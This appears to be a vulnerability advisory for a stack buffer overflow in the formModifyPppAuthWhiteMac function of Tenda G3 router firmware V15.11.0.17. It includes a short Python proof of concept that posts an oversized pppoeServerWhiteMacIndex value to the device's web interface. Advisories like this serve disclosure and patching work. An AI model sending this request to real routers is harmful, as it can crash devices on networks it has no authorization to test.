## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3107.html

## Affected version

G3 V15.11.0.17(9502)

## Vulnerability details

The Tenda G3 V15.11.0.17(9502) firmware has a stack overflow vulnerability in the `formModifyPppAuthWhiteMac` function. The `v3` variable receives the `pppoeServerWhiteMacIndex` parameter from a POST request. However, since the user can control the input of `pppoeServerWhiteMacIndex`, the statement can cause a buffer overflow. The user-provided `pppoeServerWhiteMacIndex` can exceed the capacity of the `sMibName` array, triggering this security vulnerability.

![image-20240417213449033](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417213449033.png)

![image-20240417213440899](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417213440899.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/ModifyPppAuthWhiteMac"
payload = b"a"*2000

data = {
    	'pppoeServerWhiteMacIndex':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240416114043980](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114043980.png)
